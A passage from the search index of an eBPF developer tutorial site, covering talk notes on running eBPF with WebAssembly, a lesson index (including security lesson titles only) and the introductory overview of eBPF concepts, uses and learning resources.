eBPF (1 min)</li> <li>Slide 17: Developer Experience (1 min)</li> <li>Slide 18: Examples (1 mins)</li> <li>Slide 19: The Operational Framework of wasm-bpf (1 minutes)</li> <li>Slide 20: The wasm-bpf Development Process (1 minutes)</li> <li>Slide 21: Challenges (2 mins)</li> <li>Slide 22: Wasm with user space eBPF (2 minutes)</li> <li>Slide 23-26: How eBPF Enhances Wasm Developer Experience (3 minutes)</li> <li>Closing (1 minute)</li> </ul> <ul> <li>Slide 23-26: How eBPF Enhances Wasm Developer Experience (3 minutes)</li> <li>Closing (1 minute)</li> </ul>"},{"location":"others/miscellaneous/wasm-bpf-talk/#slide-15-17-faster-easier-safer-ebpf-deployment-and-trade-offs-4-minutes","title":"Slide 15-17: Faster, easier &amp; safer eBPF deployment and Trade-offs (4 minutes)","text":"<p>However, there are trade-offs. The migration of libraries and toolchains to this new model is not trivial, with considerations around limited eBPF features in Wasm environments. But the familiar development experience, akin to that provided by libbpf-bootstrap, is a testament to our progress.</p>"},{"location":"others/miscellaneous/wasm-bpf-talk/#slice-16-use-container-tools-to-run-wasm-ebpf-1-min","title":"Slice 16: Use container tools to run Wasm + eBPF (1 min)","text":"<p>This is a demo of how to use container tools, like the podman to run Wasm and eBPF. As the GIF shows, we can using a podman container to start and run a eBPF program in WebAssembly, which can trace the run queue (scheduler) latency as a histogram for the linux system. This program is ported from the bcc tool, and compiled into WebAssembly with the eunomia-bpf toolchain. It will fetch data from bpf hash maps in the kernel, do some post-processing in userspace, and then print the result to the console. The eBPF program is integrated into the userspace WebAssembly application, which can be packed into a OCI image and started as a container with the WasmEdge runtime.</p> <p>We can also list the existing podman WebAssembly containers, and see the container we just started, and stop and remove the container.</p>"},{"location":"others/miscellaneous/wasm-bpf-talk/#slide-17-developer-experience-1-min","title":"Slide 17: Developer Experience (1 min)","text":"<p>libbpf-bootstrap is a widely used framework for developing eBPF programs in C/C++. The developer experience in WebAssembly is similar to that of libbpf-bootstrap, includes automatically generating skeleton (bpf code framework) and type definitions, just like the bpftool and libbpf-bootstrap does.</p> <p>The right part is the auto-generated skeleton from our WebAssembly bpftool, the left part is the userspace code of loading and attaching the eBPF program in C, which will be compiled into WebAssembly.</p>"},{"location":"others/miscellaneous/wasm-bpf-talk/#slide-18-examples-1-mins","title":"Slide 18: Examples (1 mins)","text":"<p>Let's take a moment to walk through some hands-on examples where eBPF in WebAssembly can support.</p> <p>First, we have 'Uprobe' for Observability or Tracing. This is like setting up a watchtower inside your applications, letting you keep an eye on how functions are running without modify them.</p> <p>Next is 'XDP' for Networking. This can be used to process packets at the lowest level before they reach the network stack, allowing you to filter, redirect, or drop packets as needed.</p> <p>And then we have 'LSM' for Security. This allows you to set rules on what the system can and cannot do, like blocking a process from accessing a file or network port in the kernel.</p>"},{"location":"others/miscellaneous/wasm-bpf-talk/#slide-19-the-operational-framework-of-wasm-bpf-1-minutes","title":"Slide 19: The Operational Framework of wasm-bpf (1 minutes)","text":"<p>Let's take a look at how wasm-bpf works. The project essentially wants to treat the Wasm sandbox as an alternative user-state runtime space on top of the OS, which means we can use Wasm to develop and deploy eBPF programs as ordinary eBPF programs, but with the added benefits of security and ease of moving from one system to another.</p> <p>In the runtime, a Wasm module can managing multiple eBPF programs, and allow <code>dynamically load</code> eBPF programs from the Wasm sandbox into the kernel, select the desired events to attach them, unattach them, control the complete lifecycle of multiple eBPF objects, and support most eBPF program types.</p> <p>Communication is a two-way street with wasm-bpf. It sets up a path for back-and-forth conversations with the kernel using eBPF Maps, making data transfer smooth and efficient with ring buffers. The eBPF can send of messages from the kernel state to the user state via <code>ring buffering</code> and perf event polling, or access hashmaps from the Wasm virtual machine. The bpf maps can also be accessed with share memory between kernel and Wasm runtime. This setup is not only flexible but also ready to grow with new kernel features without the need to modify the virtual machine's system interface.</p>"},{"location":"others/miscellaneous/wasm-bpf-talk/#slide-20-the-wasm-bpf-development-process-1-minutes","title":"Slide 20: The wasm-bpf Development Process (1 minutes)","text":"<p>Now let's move on to how we create eBPF applications with wasm.</p> <p>To develop an eBPF program, we first need to compile the corresponding source code into bpf objects using the clang/LLVM toolchain, which contains the bpf bytecode and the corresponding data structure definitions, maps and progs definitions in BTF format. Then, we can use BTF info to generate skeleton and bindings for userspace programs development. The approach is similar to component model in WebAssembly, in which we use wit-bindgen and other tools to generate bindings. Then, user can develop the userspace program in C/C++/Rust/Go, compile it into WebAssembly, and packed it with the eBPF bytecode into a OCI image.</p> <p>In the Wasm-bpf project, with the support of code generation techniques and BTF (BPF type format) information in the toolchain, all communications between Wasm and eBPF do not need to go through serialization and deserialization mechanisms. At the same time, the eBPF development experience is just like the bpftool and libbpf-bootstrap does.</p> <p>The lightweight nature of compiled eBPF-Wasm modules, which are typically around 100Kb, and they can be dynamically loaded and executed in 100ms. It's optimized for rapid deployment and execution, aligning perfectly with the fast-paced, dynamic requirements of cloud-native environments.</p>"},{"location":"others/miscellaneous/wasm-bpf-talk/#slide-21-challenges-2-mins","title":"Slide 21: Challenges (2 mins)","text":"<p>We have overcome some challenges before we can fully use eBPF's capabilities within Wasm for Kubernetes.</p> <p>Firstly, we've got some of libraries for C/C++, Rust, and Go, each enabling eBPF interactions in their respective languages. These are libbpf for C/C++, libbpf-rs for Rust, and cilium/go for Go. We need to port these libraries to Wasm to enabling developing eBPF programs in these languages with WebAssembly.</p> <p>Another challenge is the data layout. The data layout of eBPF programs, which is 64 bit, maybe different from that of Wasm, maybe 32 bit or 64 bit. We need to convert the data layout of kernel eBPF programs to the correct data layout of Wasm programs, when we need to communicate between kernel eBPF programs and userspace Wasm programs.</p> <p>The last challenge is the kernel compatibility.</p> <p>The eBPF programs may need a specific kernel version to run and also require enable the kernel configuration. We can use Compile-Once, Run Everywhere (CO-RE) technology to enhance the portability of eBPF programs, but we still need to ensure that the kernel version is compatible with the eBPF programs. We can also look at a userspace eBPF runtimeto run eBPF programs in userspace, or a compatibility layer for different kernel features.</p>"},{"location":"others/miscellaneous/wasm-bpf-talk/#slide-22-wasm-with-user-space-ebpf-2-minutes","title":"Slide 22: Wasm with user space eBPF (2 minutes)","text":"<p>Today, we're also examining a new development in system observability and interaction: the combination of WebAssembly, or Wasm, with user space eBPF runtimes.</p> <p>Wasm with kernel eBPF unlocks a lot of potential, allowing us to engage deeply with the Linux kernel. However, it does come with a need for specific kernel versions supports eBPF, and privileges to load the eBPF into the kernel.</p> <p>Enter bpftime, our new approach to eBPF that operates entirely in user space. It means we can deploy existing eBPF tracing programs without special permissions and without depending on the kernel's version, and even not limited to Linux system.</p> <p>bpftime allows us to use eBPF tools with Uprobes and Syscall tracepoints to monitor and trace applications in userspace. These tools are lightweight and don't require stopping or tweaking the applications they monitor.</p> <p>Uprobe are like the user space counterparts to kprobes, which allow us to trace userspace functions in eBPF. However, the kernel Uprobe is slow due to the overhead of context switching between kernel and user space. bpftime solves this problem by running entirely in user space, with the added advantage of being up to 10 times faster than kernel uprobe.</p> <p>Plus, bpftime plays nicely with existing eBPF toolchains. It supports inter-process eBPF maps in userspace or interacting with kernel eBPF maps, and you can run familiar tools like bcc and bpftrace entirely in user space without any change to their code.</p> <p>So, we're looking at a more flexible way to gather insights and manage systems, and also exploring potentially integrating with technologies like DPDK for network tasks. It's a step forward in making powerful system tools more accessible and efficient.</p>"},{"location":"others/miscellaneous/wasm-bpf-talk/#slide-23-26-how-ebpf-enhances-wasm-developer-experience-3-minutes","title":"Slide 23-26: How eBPF Enhances Wasm Developer Experience (3 minutes)","text":"<p>To wrap up our technical discussion, we will explore how eBPF elevates the Wasm development experience, particularly through advanced security mechanisms for WASI and sophisticated tracing capabilities that simplify debugging.</p>"},{"location":"others/miscellaneous/wasm-bpf-talk/#closing-1-minute","title":"Closing (1 minute)","text":"<p>In closing, the fusion of Wasm and eBPF is more than just a technological innovation; it's a new frontier in Kubernetes pod deployment, data analytics, and system security. We're excited for you to explore these possibilities and contribute to their evolution. Thank you for joining us today, and we look forward to your questions and insights.</p> <p>Share on  Share on </p>"},{"location":"tutorials/","title":"eBPF Tutorial by Example: Learning CO-RE eBPF Step by Step","text":"<p>This is a development tutorial for eBPF based on CO-RE (Compile Once, Run Everywhere). It provides practical eBPF development practices from beginner to advanced, including basic concepts, code examples, and real-world applications. Unlike BCC, we use frameworks like libbpf, Cilium, libbpf-rs, and eunomia-bpf for development, with examples in languages such as C, Go, and Rust.</p> <p>This tutorial does not cover complex concepts and scenario introductions. Its main purpose is to provide examples of eBPF tools (very short, starting with twenty lines of code!) to help eBPF application developers quickly grasp eBPF development methods and techniques. The tutorial content can be found in the directory, with each directory being an independent eBPF tool example.</p> <p>For the complete source code of the tutorial, please refer to the repo https://github.com/eunomia-bpf/bpf-developer-tutorial on GitHub. If you find this tutorial helpful, please give us a star!</p>"},{"location":"tutorials/#getting-started-examples","title":"Getting Started Examples","text":"<p>This section contains simple eBPF program examples and introductions. It primarily utilizes the <code>eunomia-bpf</code> framework to simplify development and introduces the basic usage and development process of eBPF.</p> <ul> <li>lesson 0-introduce Introduction to Core Concepts and Tools</li> <li>lesson 1-helloworld Hello World, Framework and Development</li> <li>lesson 2-kprobe-unlink Monitoring unlink System Calls with kprobe</li> <li>lesson 3-fentry-unlink Monitoring unlink System Calls with fentry</li> <li>lesson 4-opensnoop Capturing Opening Files and Filter with Global Variables</li> <li>lesson 5-uprobe-bashreadline Capturing readline Function Calls with Uprobe</li> <li>lesson 6-sigsnoop Capturing Signal Sending and Store State with Hash Maps</li> <li>lesson 7-execsnoop Capturing Process Execution, Output with perf event array</li> <li>lesson 8-exitsnoop Monitoring Process Exit Events, Output with Ring Buffer</li> <li>lesson 9-runqlat Capturing Scheduling Latency and Recording as Histogram</li> <li>lesson 10-hardirqs Capturing Interrupts with hardirqs or softirqs</li> </ul>"},{"location":"tutorials/#advanced-documents-and-examples","title":"Advanced Documents and Examples","text":"<p>We start to build complete eBPF projects mainly based on <code>libbpf</code> and combine them with various application scenarios for practical use.</p> <ul> <li>lesson 11-bootstrap Develop User-Space Programs with libbpf and Trace exec() and exit()</li> <li>lesson 12-profile Using eBPF Program Profile for Performance Analysis</li> <li>lesson 13-tcpconnlat Statistics of TCP Connection Delay with libbpf</li> <li>lesson 14-tcpstates Recording TCP Connection Status and TCP RTT</li> <li>lesson 15-javagc Capturing User-Space Java GC Duration Using USDT</li> <li>lesson 16-memleak Monitoring Memory Leaks</li> <li>lesson 17-biopattern Count Random/Sequential Disk I/O</li> <li>lesson 18-further-reading More Reference Materials\uff1a papers, projects</li> <li>lesson 19-lsm-connect Security Detection and Defense using LSM</li> <li>lesson 20-tc tc Traffic Control</li> <li>lesson 21-xdp Programmable Packet Processing with XDP</li> </ul>"},{"location":"tutorials/#in-depth-topics","title":"In-Depth Topics","text":"<p>This section covers advanced topics related to eBPF, including using eBPF programs on Android, possible attacks and defenses using eBPF programs, and complex tracing. Combining the user-mode and kernel-mode aspects of eBPF can bring great power (as well as security risks).</p> <p>Android:</p> <ul> <li>lesson 22-android Using eBPF Programs on Android</li> </ul> <p>Networking:</p> <ul> <li>lesson 23-http L7 Tracing with eBPF: HTTP and Beyond via Socket Filters and Syscall Tracepoints</li> <li>lesson 29-sockops Accelerating Network Request Forwarding with Sockops</li> <li>lesson 41-xdp-tcpdump Capturing TCP Information with XDP</li> <li>lesson 42-xdp-loadbalancer XDP Load Balancer</li> </ul> <p>Security:</p> <ul> <li>lesson 24-hide Hiding Process or File Information</li> <li>lesson 25-signal Using bpf_send_signal to Terminate Malicious Processes in eBPF</li> <li>lesson 26-sudo Using eBPF to add sudo user</li> <li>lesson 27-replace Replace Text Read or Written by Any Program with eBPF</li> <li>lesson 28-detach Running eBPF After Application Exits: The Lifecycle of eBPF Programs</li> <li>lesson 34-syscall Modifying System Call Arguments with eBPF</li> </ul> <p>Scheduler:</p> <ul> <li>lesson 44-scx-simple Introduction to the BPF Scheduler</li> <li>lesson 45-scx-nest Implementing the <code>scx_nest</code> Scheduler</li> </ul> <p>Other:</p> <ul> <li>lesson 35-user-ringbuf Asynchronously Send to Kernel with User Ring Buffer</li> <li>lesson 36-userspace-ebpf Userspace eBPF Runtimes: Overview and Applications</li> <li>lesson 38-btf-uprobe Expanding eBPF Compile Once, Run Everywhere(CO-RE) to Userspace Compatibility</li> <li>lesson 43-kfuncs Extending eBPF Beyond Its Limits: Custom kfuncs in Kernel Modules</li> </ul> <p>Continuously updating...</p>"},{"location":"tutorials/#bcc-and-bpftrace-tutorial","title":"bcc and bpftrace tutorial","text":"<p>For reference:</p> <ul> <li>BPF Features by Linux Kernel Version</li> <li>Kernel Configuration for BPF Features</li> <li>bcc Reference Guide</li> <li>Special Filtering</li> <li>bcc Tutorial\".- bcc Python Developer Tutorial</li> <li>bpftrace Tutorial</li> </ul> <p>Share on  Share on </p>"},{"location":"tutorials/SUMMARY/","title":"eBPF Tutorial by Example: Learning CO-RE eBPF Step by Step","text":"<p>This is a development tutorial for eBPF based on CO-RE (Compile Once, Run Everywhere). It provides practical eBPF development practices from beginner to advanced, including basic concepts, code examples, and real-world applications. Unlike BCC, we use frameworks like libbpf, Cilium, libbpf-rs, and eunomia-bpf for development, with examples in languages such as C, Go, and Rust.</p> <p>This tutorial does not cover complex concepts and scenario introductions. Its main purpose is to provide examples of eBPF tools (very short, starting with twenty lines of code!) to help eBPF application developers quickly grasp eBPF development methods and techniques. The tutorial content can be found in the directory, with each directory being an independent eBPF tool example.</p> <p>For the complete source code of the tutorial, please refer to the repo https://github.com/eunomia-bpf/bpf-developer-tutorial on GitHub. If you find this tutorial helpful, please give us a star!</p>"},{"location":"tutorials/SUMMARY/#getting-started-examples","title":"Getting Started Examples","text":"<p>This section contains simple eBPF program examples and introductions. It primarily utilizes the <code>eunomia-bpf</code> framework to simplify development and introduces the basic usage and development process of eBPF.</p> <ul> <li>lesson 0-introduce Introduction to Core Concepts and Tools</li> <li>lesson 1-helloworld Hello World, Framework and Development</li> <li>lesson 2-kprobe-unlink Monitoring unlink System Calls with kprobe</li> <li>lesson 3-fentry-unlink Monitoring unlink System Calls with fentry</li> <li>lesson 4-opensnoop Capturing Opening Files and Filter with Global Variables</li> <li>lesson 5-uprobe-bashreadline Capturing readline Function Calls with Uprobe</li> <li>lesson 6-sigsnoop Capturing Signal Sending and Store State with Hash Maps</li> <li>lesson 7-execsnoop Capturing Process Execution, Output with perf event array</li> <li>lesson 8-exitsnoop Monitoring Process Exit Events, Output with Ring Buffer</li> <li>lesson 9-runqlat Capturing Scheduling Latency and Recording as Histogram</li> <li>lesson 10-hardirqs Capturing Interrupts with hardirqs or softirqs</li> </ul>"},{"location":"tutorials/SUMMARY/#advanced-documents-and-examples","title":"Advanced Documents and Examples","text":"<p>We start to build complete eBPF projects mainly based on <code>libbpf</code> and combine them with various application scenarios for practical use.</p> <ul> <li>lesson 11-bootstrap Develop User-Space Programs with libbpf and Trace exec() and exit()</li> <li>lesson 12-profile Using eBPF Program Profile for Performance Analysis</li> <li>lesson 13-tcpconnlat Statistics of TCP Connection Delay with libbpf</li> <li>lesson 14-tcpstates Recording TCP Connection Status and TCP RTT</li> <li>lesson 15-javagc Capturing User-Space Java GC Duration Using USDT</li> <li>lesson 16-memleak Monitoring Memory Leaks</li> <li>lesson 17-biopattern Count Random/Sequential Disk I/O</li> <li>lesson 18-further-reading More Reference Materials\uff1a papers, projects</li> <li>lesson 19-lsm-connect Security Detection and Defense using LSM</li> <li>lesson 20-tc tc Traffic Control</li> <li>lesson 21-xdp Programmable Packet Processing with XDP</li> </ul>"},{"location":"tutorials/SUMMARY/#in-depth-topics","title":"In-Depth Topics","text":"<p>This section covers advanced topics related to eBPF, including using eBPF programs on Android, possible attacks and defenses using eBPF programs, and complex tracing. Combining the user-mode and kernel-mode aspects of eBPF can bring great power (as well as security risks).</p> <p>Android:</p> <ul> <li>lesson 22-android Using eBPF Programs on Android</li> </ul> <p>Networking:</p> <ul> <li>lesson 23-http L7 Tracing with eBPF: HTTP and Beyond via Socket Filters and Syscall Tracepoints</li> <li>lesson 29-sockops Accelerating Network Request Forwarding with Sockops</li> <li>lesson 41-xdp-tcpdump Capturing TCP Information with XDP</li> <li>lesson 42-xdp-loadbalancer XDP Load Balancer</li> </ul> <p>Security:</p> <ul> <li>lesson 24-hide Hiding Process or File Information</li> <li>lesson 25-signal Using bpf_send_signal to Terminate Malicious Processes in eBPF</li> <li>lesson 26-sudo Using eBPF to add sudo user</li> <li>lesson 27-replace Replace Text Read or Written by Any Program with eBPF</li> <li>lesson 28-detach Running eBPF After Application Exits: The Lifecycle of eBPF Programs</li> <li>lesson 34-syscall Modifying System Call Arguments with eBPF</li> </ul> <p>Scheduler:</p> <ul> <li>lesson 44-scx-simple Introduction to the BPF Scheduler</li> <li>lesson 45-scx-nest Implementing the <code>scx_nest</code> Scheduler</li> </ul> <p>Other:</p> <ul> <li>lesson 35-user-ringbuf Asynchronously Send to Kernel with User Ring Buffer</li> <li>lesson 36-userspace-ebpf Userspace eBPF Runtimes: Overview and Applications</li> <li>lesson 38-btf-uprobe Expanding eBPF Compile Once, Run Everywhere(CO-RE) to Userspace Compatibility</li> <li>lesson 43-kfuncs Extending eBPF Beyond Its Limits: Custom kfuncs in Kernel Modules</li> </ul> <p>Continuously updating...</p>"},{"location":"tutorials/SUMMARY/#bcc-and-bpftrace-tutorial","title":"bcc and bpftrace tutorial","text":"<p>For reference:</p> <ul> <li>BPF Features by Linux Kernel Version</li> <li>Kernel Configuration for BPF Features</li> <li>bcc Reference Guide</li> <li>Special Filtering</li> <li>bcc Tutorial\".- bcc Python Developer Tutorial</li> <li>bpftrace Tutorial</li> </ul> <p>Share on  Share on </p>"},{"location":"tutorials/0-introduce/","title":"eBPF Tutorial by Example 0: Introduction to Core Concepts and Tools","text":"<p>This is the first part of a comprehensive development tutorial for eBPF, designed to guide you through practical eBPF development, from beginner to advanced. It covers fundamental concepts, real-world code examples, and applications in modern systems. Rather than focusing on traditional tools like BCC, we will use modern frameworks such as <code>libbpf</code>, <code>Cilium</code>, <code>libbpf-rs</code>, and eunomia-bpf, with examples provided in <code>C</code>, <code>Go</code>, and <code>Rust</code>.</p> <p>The primary goal of this tutorial is to provide clear and concise examples of eBPF tools (starting with as little as 20 lines of code!) to help developers quickly grasp essential eBPF development techniques. Each example is self-contained and can be found in the directory structure, with every directory representing an independent eBPF tool. You can also visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and complete tutorial source code.</p>"},{"location":"tutorials/0-introduce/#introduction-to-ebpf-secure-and-efficient-kernel-extension","title":"Introduction to eBPF: Secure and Efficient Kernel Extension","text":"<p>eBPF (extended Berkeley Packet Filter) is a groundbreaking technology that allows developers to run small programs directly in kernel space, safely and efficiently. Unlike traditional approaches that required modifying kernel source code or loading new modules, eBPF made it possible to customize and optimize network behavior dynamically, all without disrupting system operations. This flexibility and efficiency made eBPF a pivotal technology for overcoming the limitations of traditional networking stacks.</p>"},{"location":"tutorials/0-introduce/#what-makes-ebpf-so-powerful","title":"What Makes eBPF So Powerful?","text":"<ul> <li>Direct Kernel Interaction: eBPF programs execute within the kernel, interacting with system-level events such as network packets, system calls, or tracepoints.</li> <li>Safe Execution: eBPF ensures safety through a verifier that checks the logic of the program before it runs, preventing potential kernel crashes or security breaches.</li> <li>Minimal Overhead: eBPF achieves near-native execution speed by employing a Just-In-Time (JIT) compiler, which translates eBPF bytecode into optimized machine code for the specific architecture.</li> </ul>"},{"location":"tutorials/0-introduce/#ebpf-past-present-and-future","title":"eBPF: Past, Present, and Future","text":""},{"location":"tutorials/0-introduce/#past-programmable-networking-transformed","title":"Past: Programmable Networking Transformed","text":"<p>When eBPF was introduced in 2014, it revolutionized how developers approached networking by allowing small, programmable kernel-space applications to handle packet processing in real time. By hooking into key kernel points, eBPF enabled custom logic to be applied whenever a network packet arrived, leading to higher efficiency and flexibility. This allowed organizations to tailor networking behavior without the overhead of custom drivers or kernel modifications, creating an ideal solution for cloud-native and data-center environments.</p>"},{"location":"tutorials/0-introduce/#present-a-versatile-framework-for-modern-computing-needs","title":"Present: A Versatile Framework for Modern Computing Needs","text":"<p>eBPF has evolved into a versatile framework that extends beyond its original purpose of networking, now encompassing observability, tracing, security, and even system resource management. eBPF programs can dynamically hook into kernel events, giving developers precise control over system behavior and performance optimization without requiring kernel modifications or reboots. This makes eBPF an essential tool for system administrators and developers who aim to monitor, optimize, and secure their environments.</p> <p>Here are some key areas where eBPF is widely used today:</p> <ul> <li> <p>Networking: eBPF offers real-time, high-speed packet filtering and processing within the kernel, allowing for the creation of custom protocol parsers and network policies without needing new drivers or system restarts. This enables highly efficient network management in cloud and data center environments.</p> </li> <li> <p>Observability: eBPF enables developers to gather detailed insights into system behavior by collecting custom metrics and performing in-kernel data aggregation. By tapping into kernel tracepoints and function calls, eBPF helps identify performance issues and track down elusive bugs.</p> </li> <li> <p>Tracing &amp; Profiling: eBPF provides powerful tracing and profiling capabilities by attaching to kernel functions, tracepoints, and even user-space probes. This allows developers to gain deep insights into system and application behavior, enabling them to optimize performance and resolve complex system issues.</p> </li> <li> <p>Security: eBPF plays a vital role in real-time security monitoring. It enables deep inspection of system calls, network traffic, and other kernel activities, helping to enforce dynamic security policies and detect anomalous behavior, providing an efficient way to safeguard infrastructure.</p> </li> <li> <p>Scheduler Optimization: eBPF is increasingly used to enhance CPU scheduling, offering the ability to monitor CPU load and optimize how tasks are distributed across cores. This can lead to more efficient use of CPU resources and improved system responsiveness.</p> </li> <li> <p>HID (Human Interface Device) Driver Enhancements: Developers use eBPF to optimize HID drivers for devices like keyboards, mice, and touchscreens. By adding custom logic for handling input events, eBPF improves responsiveness in latency-sensitive applications.</p> </li> </ul> <p>Organizations across industries have adopted eBPF at scale:</p> <ul> <li>Google: Uses eBPF for security auditing, packet processing, real-time performance monitoring, and optimizing CPU scheduling across its vast infrastructure.</li> <li>Netflix: Leverages eBPF for network traffic analysis, ensuring high availability and performance for streaming services.</li> <li>Android: Applies eBPF to optimize network usage, power consumption, and resource allocation, improving performance and battery life on millions of devices.</li> <li>S&amp;P Global: Utilizes eBPF through Cilium for managing networking across multiple clouds and on-premises systems, ensuring scalability and security.</li> <li>Shopify: Implements eBPF with Falco for intrusion detection, bolstering security on its e-commerce platform.</li> <li>Cloudflare: Uses eBPF for network observability, security monitoring, and performance optimization, protecting millions of websites globally.</li> </ul> <p>eBPF's ability to dynamically adjust system behavior and extend into user space makes it an essential technology for modern computing. Whether it's optimizing network traffic, improving security, or enhancing system performance, eBPF enables developers to address real-time requirements efficiently and safely.</p> <p>In addition to its kernel-mode runtime, eBPF can also be extended to user space. For example, bpftime, a user-space eBPF runtime, allows for higher-performance tracing, performance analysis, and plugin support in user-space applications. This extension of eBPF into user space helps improve flexibility and performance in various use cases that go beyond kernel-level tasks.</p>"},{"location":"tutorials/0-introduce/#future-the-expanding-potential-of-ebpf","title":"Future: The Expanding Potential of eBPF","text":"<p>Looking forward, eBPF is expected to become an even more integral part of operating systems. The focus is on improving its flexibility, modularity, and ease of use, making it accessible for an even broader range of applications. Innovations in memory management, concurrency mechanisms, and better integration with user-space applications are on the horizon. Projects are already underway to compile significant parts of the Linux kernel to the BPF instruction set, potentially revolutionizing how kernel development and analysis are performed.</p> <p>Advancements such as dynamic stacks, better observability tools for user space (e.g., Fast Uprobes and language-specific stack walkers), and safer program termination mechanisms will continue to strengthen eBPF\u2019s reliability and expand its use cases. Additionally, new tools and libraries will simplify eBPF development, lowering the barrier to entry for both kernel and application developers.</p>"},{"location":"tutorials/0-introduce/#getting-started-with-the-tutorial","title":"Getting Started with the Tutorial","text":"<p>This tutorial provides practical eBPF development practices, covering topics from beginner to advanced levels. We focus on hands-on examples in areas like observability, networking, and security, using frameworks like <code>libbpf</code>, <code>libbpf-rs</code>, and <code>eunomia-bpf</code>, with examples in C, Go, and Rust.</p>"},{"location":"tutorials/0-introduce/#who-is-this-tutorial-for","title":"Who Is This Tutorial For?","text":"<ul> <li>Developers looking to implement custom kernel solutions.</li> <li>System Administrators aiming to enhance performance and security.</li> <li>Tech Enthusiasts exploring cutting-edge kernel technologies.</li> </ul>"},{"location":"tutorials/0-introduce/#what-will-you-learn","title":"What Will You Learn?","text":"<ul> <li>Core Concepts: eBPF fundamentals and integration with the Linux kernel.</li> <li>Practical Skills: Writing and deploying eBPF programs.</li> <li>Advanced Topics: Exploring security, tracing, and future innovations in eBPF.</li> </ul>"},{"location":"tutorials/0-introduce/#table-of-contents","title":"Table of Contents","text":"<ol> <li> <p>Introduction to eBPF    Basic concepts and the tools you need to get started.</p> </li> <li> <p>Beginner Examples    Simple programs such as \"Hello World\" and basic tracing using kprobe and uprobe.</p> </li> <li> <p>Observability    Examples focused on monitoring network traffic, file operations, and process behavior using eBPF.</p> </li> <li> <p>Networking    Examples focused on modifying and optimizing network traffic, such as XDP, TC, and socket.</p> </li> <li> <p>Security    Programs for hiding process and files, sending signals to kill process, and tracking process events for security.</p> </li> <li> <p>Advanced Use Cases    Complex examples involving performance profiling, scheduler optimization, and eBPF in user space (e.g., bpftime).</p> </li> <li> <p>In-Depth Topics    Exploring eBPF for Android, using eBPF for network acceleration, and securing systems through syscall modifications.</p> </li> </ol>"},{"location":"tutorials/0-introduce/#how-to-use-ebpf-programming","title":"How to Use eBPF Programming","text":"<p>Writing eBPF programs from scratch can be complex. To simplify this, LLVM introduced the ability to compile high-level language code into eBPF bytecode in 2015. The eBPF community has since built libraries like <code>libbpf</code> to manage these programs. These libraries help load eBPF bytecode into the kernel and perform essential tasks. The Linux kernel source contains numerous eBPF examples in the <code>samples/bpf/</code> directory.</p> <p>A typical eBPF program involves two parts: kernel space code (<code>*_kern.c</code>) and user space code (<code>*_user.c</code>). The kernel space code defines the logic, while the user space code manages loading and interacting with the kernel. However, tools like <code>libbpf-bootstrap</code> and the Go eBPF library help simplify this process, allowing for one-time compilation and easier development.</p>"},{"location":"tutorials/0-introduce/#tools-for-ebpf-development","title":"Tools for eBPF Development","text":"<ul> <li>BCC: A Python-based toolchain that simplifies writing, compiling, and loading eBPF programs. It offers many pre-built tracing tools but has limitations with dependencies and compatibility.</li> <li>eBPF Go Library: A Go library that decouples the process of obtaining eBPF bytecode from the loading and management of eBPF programs.</li> <li>libbpf-bootstrap: A modern scaffold based on <code>libbpf</code> that provides an efficient workflow for writing eBPF programs, offering a simple one-time compilation process for reusable bytecode.</li> <li>eunomia-bpf: A toolchain for writing eBPF programs with only kernel space code. It simplifies the development of eBPF programs by dynamically loading them.</li> </ul> <p>These tools help reduce the complexity of developing eBPF programs, making the process more accessible to developers aiming to optimize system performance, security, and observability.</p>"},{"location":"tutorials/0-introduce/#some-tips-on-learning-ebpf-development","title":"Some Tips on Learning eBPF Development","text":"<p>This article will not provide a more detailed introduction to the principles of eBPF, but here is a learning plan and reference materials that may be of value:</p>"},{"location":"tutorials/0-introduce/#introduction-to-ebpf-5-7h","title":"Introduction to eBPF (5-7h)","text":"<ul> <li>Google or other search engines: eBPF</li> <li>Ask ChatGPT-like things: What is eBPF?</li> </ul> <p>Recommended:</p> <ul> <li>Read the introduction to ebpf: https://ebpf.io/ (30min)</li> <li>Briefly understand the ebpf kernel-related documentation: https://docs.ebpf.io/ (Know where to queries for tech details, 30min)</li> </ul> <p>Answer three questions:</p> <ol> <li>Understand what eBPF is? Why do we need it? Can't we use kernel modules?</li> <li>What functions does it have? What can it do in the Linux kernel? What are the types of eBPF programs and helpers (not all of them need to be known, but need to know where to find them)?</li> <li>What can it be used for? For example, in which scenarios can it be used? Networking, security, observability?</li> </ol>"},{"location":"tutorials/0-introduce/#understand-how-to-develop-ebpf-programs-10-15h","title":"Understand how to develop eBPF programs (10-15h)","text":"<p>Understand and try eBPF development frameworks:</p> <ul> <li>bpftrace tutorial\uff1ahttps://eunomia.dev/tutorials/bpftrace-tutorial/ \uff08Try it\uff0c1h\uff09</li> <li>Examples of developing various tools with BCC: https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md (Run through, 3-4h)</li> <li>Some examples of libbpf: https://github.com/libbpf/libbpf-bootstrap (Run any interesting one and read the source code, 2h)</li> <li>Tutorials: https://github.com/eunomia-bpf/bpf-developer-tutorial (Read part 1-10, 3-4h)</li> </ul> <p>Other development frameworks: Go or Rust language, please search and try on your own (0-2h)</p> <p>Have questions or things you want to know, whether or not they are related to this project, you can start discussing in the discussions of this project.</p> <p>Answer some questions and try some experiments (2-5h):</p> <ol> <li>How to develop the simplest eBPF program?</li> <li>How to trace a kernel feature or function with eBPF? There are many ways, provide corresponding code examples;</li> <li>What are the solutions for communication between user mode and kernel mode? How to send information from user mode to kernel mode? How to pass information from kernel mode to user mode? Provide code examples;</li> <li>Write your own eBPF program to implement a feature;</li> <li>In the entire lifecycle of an eBPF program, what does it do in user mode and kernel mode?</li> </ol>"},{"location":"tutorials/0-introduce/#references","title":"References","text":"<ul> <li>eBPF Introduction: https://ebpf.io/</li> <li>BPF Compiler Collection (BCC): https://github.com/iovisor/bcc</li> <li>eunomia-bpf: https://github.com/eunomia-bpf/eunomia-bpf</li> </ul> <p>You can also visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and complete tutorial source code. All content is open source. We will continue to share more content about eBPF development practices to help you better understand and master eBPF technology.\".</p> <p>Share on  Share on </p>"},{"location":"tutorials/1-helloworld/","title":"eBPF Tutorial by Example 1: Hello World, Framework and Development","text":"<p>In this blog post, we will delve into the basic framework and development process of eBPF (Extended Berkeley Packet Filter). eBPF is a powerful network and performance analysis tool that runs on the Linux kernel, providing developers with the ability to dynamically load, update, and run user-defined code at kernel runtime. This enables developers to implement efficient, secure kernel-level network monitoring, performance analysis, and troubleshooting 